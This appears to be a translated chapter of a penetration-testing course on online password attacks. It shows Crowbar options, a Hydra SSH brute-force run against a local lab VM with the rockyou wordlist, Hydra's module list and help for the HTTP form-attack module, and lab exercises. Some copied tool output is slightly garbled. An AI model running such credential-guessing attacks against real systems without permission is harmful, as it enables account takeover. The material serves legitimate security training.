
| 选项 | 描述 |
| :--- | :--- |
| `-n THREAD, --number THREAD` | 同时活动的线程数 |
| `-l FILE, --log FILE` | 日志文件（仅写入尝试记录） |
| `-o FILE, --output FILE` | 输出文件（写入其他所有内容） |
| `-c PASSWD, --passwd PASSWD` | 用于登录的静态密码 |
| `-C FILE, --passwdfile FILE` | 用于登录的多个密码，存储在一个文件中 |
| `-t TIMEOUT, --timeout TIMEOUT` | `[SSH]` 每个线程等待多长时间（秒） |
| `-p PORT, --port PORT` | 如果服务不使用默认值，则更改端口 |
| `-k KEY_FILE, --keyfile KEY_FILE` | `[SSH/VNC]` (私钥) 密钥文件或包含多个文件的文件夹 |
| `-m CONFIG, --config CONFIG` | `[OpenVPN]` 配置文件 |
| `-d, --discover` | 在攻击开放端口之前进行端口扫描 |
| `-v, --verbose` | 启用详细输出 (`-vv` 获取更多) |
| `-D, --debug` | 启用调试模式 |
| `-q, --quiet` | 仅显示成功的登录 |

*列表 607 - Crowbar 帮助输出*

### 19.3.2.1 练习

*(这些练习不需要报告)*

1. 创建一个包含你的 Windows 客户端密码的密码列表，并使用它对 Windows 客户端重复上述 Crowbar 密码攻击。

#### 19.3.3 使用 THC-Hydra 进行 SSH 攻击

`THC-Hydra` 是另一个正在积极开发的强大网络服务攻击工具，值得掌握。我们可以用它来攻击各种协议身份验证方案，包括 `SSH` 和 `HTTP`。

标准选项包括 `-l` 用于指定目标用户名，`-P` 用于指定单词列表，以及 `protocol://IP` 分别用于指定目标协议和 IP 地址。

在这个第一个示例中，我们将攻击我们的 Kali VM。我们将在本地机器上使用 SSH 协议 `ssh://127.0.0.1`，专注于 `kali` 用户 (`-l kali`)，并再次使用 `rockyou` 单词列表 (`-P`)。

```
kali@kali:~$ hydra -l kali -P /usr/share/wordlists/rockyou.txt ssh://127.0.0.1

Hydra v8.8 (c) 2019 by van Hauser/THC - Please do not use in military or secret service

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2019-06-07 08:35:59

[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended

[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (1:1/p:14344399)

[DATA] attacking ssh://127.0.0.1:22/

[22][ssh] host: 127.0.0.1   login: kali    password: whatever

1 of 1 target successfully completed, 1 valid password found

Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2019-06-07 08:36:13
```

*列表 608 - 使用 Hydra 进行 SSH 攻击*

在输出中，我们可以看到 `hydra` 发现了针对本地 SSH 服务器的有效登录。

`THC-Hydra` 支持多种标准协议和服务，如下面的列表 609 所示：

```
kali@kali:~$ hydra

Hydra v8.8 (c) 2019 by van Hauser/THC - Please do not use in military or secret service

Syntax: hydra [[[-L LOGIN|-L FILE] [-P PASS|-P FILE] | [-C FILE]] [-e nsr] [-o FILE]

[-t TASKS] [-M FILE [-T TASKS]] [-w TIME] [-W TIME] [-z] [-s PORT] [-x MIN:MAX:CHARSET

] [-c TIME] [-IS0uVd46] [service://server::PORT][/OPT]]

...

Supported services: adams6500 asterisk cisco cisco-enable cvs firebird ftp tftp http[s]

-[head|get|post] http[s]--[get|post] -form http-proxy http-proxy-urlenum icq imap[s] irc

ldapt[s] ldapt[s]-[cram|digest]md5[s] mssql mysql nntp oracle-listener oracle-sid pcany

where pcfw pop3[s] postgres radmin2 rdp redis rexec rlogin rproxy rsync s7-300 sip

smb smtp[s] smtp-enam snmp sock5 ssh sstkey svn teamspeak telnet[s] vmauthd vnc xnxp

...
```

*列表 609 - THC-Hydra 支持的模块*

### 19.3.3.1 练习

*(这些练习不需要报告)*

1. 在你的 Kali VM 上重现 Hydra SSH 攻击。

#### 19.3.4 使用 THC-Hydra 进行 HTTP POST 攻击

作为另一个示例，我们将使用 Hydra 对我们的 Windows Apache 服务器执行 HTTP POST 攻击。当使用 HTTP POST 请求进行用户登录时，最常通过网页表单实现，这意味着我们应该使用 "`http-form-post`" 服务模块。我们可以提供服务名称后跟 `-u` 以获取有关所需参数的额外信息：

```
kali@kali:~$ hydra http-form-post -u

Help for module http-post-form:

Module http-post-form requires the page and the parameters for the web form.

By default this module is configured to follow a maximum of 5 redirecations in a row. It always gathers a new cookie from the same URL without variables

The parameters take three ":" separated values, plus optional values.

(Note: if you need a colon in the option string as value, escape it with "\\\\", but do not escape colons in URL encoding)

Syntax: <url>::<form parameters>[:<condition string>[:<optional>[:<optional>]]]

First is the page on the server to GET or POST to (URL).

Second is the POST/GET variables (taken from either the browser, proxy, etc,

with url-encoded (resp, base64-encoded) usernames and passwords being replaced in the

"^USERA^" (resp. "^USER64^") and "^PASSA^" (resp. "^PASS64^") placeholders (FORM PARAMS).

Third is the string that it checks for an ^invalid^ login (by default)

Invalid condition login check can be preceded by "F=^", successful condition
```
